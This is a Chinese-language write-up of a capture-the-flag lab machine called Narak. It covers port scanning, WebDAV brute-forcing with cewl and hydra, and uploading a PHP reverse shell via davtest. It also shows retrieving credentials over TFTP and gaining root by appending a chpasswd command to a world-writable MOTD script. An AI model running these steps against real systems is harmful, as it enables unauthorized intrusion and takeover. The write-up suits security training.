2. 渗透

2.1. 主机发现、端口扫描、端口服务发现

sudo arp-scan -l
sudo nmap -p- 10.0.2.24
sudo nmap -p22,80 -A 10.0.2.24

信息：

  • 22端口的服务为ssh
  • 80端口的服务为http，版本为Apache2.4.29
  • 靶机操作系统为Ubuntu

2.2. 访问http服务

访问80端口，发现不论是源码还是抓包都没有有用的信息。最开始还以为

这里面的图片可能存在着隐写，但是尝试过后发现也没有。

没有办法，进行路径扫描： 

dirsearch -u http://10.0.2.24/

有一个关键的信息，有一个/webdav/的目录，但是状态码是401，也就是需要验证

但是目前并没有任何相关的用户名和密码的信息，因此，接着利用自己的字典扫描，看一下是否存在隐藏的文件（也可以用gobuster，会更快） 

dirsearch -u http://10.0.2.24 -f -e html,php,txt -w /usr/share/wordlists/dirb/common.txt

gobuster dir -u http://10.0.2.24 -w /usr/share/dirb/wordlists/common.txt -x txt,php,html

最终扫描出一个可以的文件 tips.txt，直接访问该文件得到如下信息： 

Hint to open the door of narak can be found in creds.txt.

但是直接访问creds.txt文件，服务器提示没有该文件，最开始还以为这是作者恶作剧。

2.3. get shell

2.3.1. 方法1-(暴力破解)

分为两种：

  • 纯暴力破解
  • 针对目标站点生成定制字典，比如cewl工具

经过一定的信息收集，除了知道 tips.txt 和 creds.txt 之外，没有其他有用的信息，因此尝试直接暴力破解。暴力破解分为两种：

  • 纯暴力破解
  • 针对目标站点生成定制字典，比如cewl工具

经尝试这里纯暴力破解是没有用的，因此采用第二种。

  1. 首先生成定制的字典，利用cewl工具

    cewl 10.0.2.24/ -w dic.txt

  2. 利用hydra配合刚刚生成的字典进行爆破

    hydra -L dic.txt -P dic.txt 10.0.2.24 http-get /webdav

    username: yamdoot
password: Swarg

然后直接访问，发现文件为空。但是这里可以利用两个工具，首先介绍davtest。该工具可以测试是否能够远程连接上webdav服务器，测试当前用户的权限，测试哪些文件格式可以被执行，还可以直接上传文件等功能。

davtest -url http://10.0.2.24/webdav -auth yamdoot:Swarg

它做了4件事：

  1. 测试能否连接，如果可以，并生成一个session
  2. 创建文件夹
  3. 发送文件
  4. 执行文件

从中发现可以上传php文件，并且也可以执行php文件。因此可以上传一个反弹shell的php文件，然后执行即可。

davtestdavtest -url http://10.0.2.24/webdav -auth yamdoot:Swarg -uploadfile php-reverse-shell.php -uploadloc rev.php

解释：

  1. php-reverse-shell.php是kali自带的，路径：/usr/share/webshells/php/php-reverse-shell.php

  2. -uploadfile 后面是kali上的文件名

  3. -uploadloc 后面是上传到靶机上面之后的文件名（路径）

  4. -uploadfile 和 -uploadloc 要一起使用！

  5. 记得修改php-reverse-shell.php中的IP和端口信息

kali监听对应端口之后网页访问对应的文件

成功get shell！

2.3.2. 方法2-(扫描UDP端口)

tips.txt中告诉我们存在creds.txt，但是直接访问又不存在，因此可以考虑一下扫描UDP端口： 

nmap -sU -F 10.0.2.24

# -sU: 扫描UDP端口
# -F: 只扫描常用的100个端口

切记，不要全端口扫描，否则一天可能都扫不完。

发现udp开了两个端口：

  • 68是dhcp服务
  • 69是tftp服务

前者就是动态分IP没有什么利用的价值，而后者是一个简单的文件传输的服务。可以直接使用下面的命令连接： 

tftp 10.0.24

然后根据tips.txt的提示，下载creds.txt文件 

get creds.txt

查看creds.txt，发现是经过base64编码的，解码同样得到了用户名和密码 

┌──(root💀kali)-[~]
└─# cat creds.txt

┌──(root💀kali)-[~]
└─# echo 'eWFtZG9vdDpTd2FyZw=='|base64 -d
yamdoot:Swarg

这里使用另一款工具cadaver。这款工具可以直接连接上去，然后上传文件即可。

2.4. 权限提升

首先从/etc/passwd中发现存在着四个用户：root, narak, inferno, yamdoot

然后进行其他信息收集。 ### 2.4.1. get inferno权限 使用下面命令查找有可能存在问题的文件： 

find / -type f -user root -perm -ug=x,-o=w -exec ls -l '{}' \; 2>/dev/null

上述命令解释：

  • 从根目录开始寻找文件
  • 属主为root
  • 权限信息：属主和同一组的有执行权限，其他用户可以写
  • 将找到的文件显示出来
  • 中间报错信息可能是因为权限不够，因此不重要，利用 2>/dev/null 重定向，不显示出来

其实我想的是先提到某个用户的权限，再提到root，因此最开始查询的文件属主分别是：narak, inferno, yamdoot。但是没有文件，因此查看root的，发现了一个奇怪的文件

2.4.2. get root权限

2.4.2.1. 方法1-(MOTD提权)

经过信息收集，还是没有可以利用的点。但是注意到刚刚执行下面命令时，还有其他可疑的文件。 

find / -type f -user root -perm -ug=x,-o=w -exec ls -l '{}' \; 2>/dev/null

motd: message of the day
一般使用ssh或者直接登录时，会优先执行/etc/update-motd.d/目录下的脚本文件，因此才有上面ssh登录时的一些信息

可以看到这些文件对所有用户开放了权限。因此可以利用这些文件，朝里面写入修改root用户的密码，然后下次登录时就会执行这些文件，因此修改了root的用户密码，因此我们就能提权到root。下面命令就是将echo 'root:hdfzzf'|chpasswd写入到文件中： 

inferno@ubuntu:~$ echo "echo 'root:hdfzzf'|chpasswd" >> /etc/update-motd.d/00-header

重新ssh连接，然后su root即可
